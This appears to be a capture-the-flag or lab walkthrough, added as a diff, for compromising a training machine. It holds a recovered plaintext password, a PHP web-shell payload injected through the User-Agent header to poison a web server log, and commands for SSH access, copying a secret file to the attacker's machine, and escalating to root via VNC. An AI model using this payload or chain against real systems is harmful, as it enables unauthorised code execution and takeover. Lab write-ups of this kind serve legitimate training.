@@ -1,0 +1,48 @@
+To decode multiple encoding of Base64:
+Base64 decode 13 times - command 
+
+for i in $(seq 0 12); do echo -n '|base64 -d';done
+
+Followed by
+
+cat base64.txt |base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d
+
+password after decoding base64 13 times
+
+Charix!2#4%6&8(0  
+
+Log poisoning:
+
+Make a request to /var/log/httpd-access.log
+
+inject the User-agent with <?php system($_REQUEST['kk']) ?>
+
+Keypoints:
+
+Make SSH request using
+
+ssh charix@10.10.10.84
+
+After getting initial access to user, use below command to check process running on root
+
+ps -aux
+
+Transfer secret.zip from remote to kalimachine
+
+scp charix@10.10.10.84:/home/charix/secret.zip .
+
+Unzip secret.zip and use below command to VNC running on port 5904 to get the root
+
+vncviewer -passwd secret localhost:5904
+
+
+
+
+
+
+
+
+
+
+
+
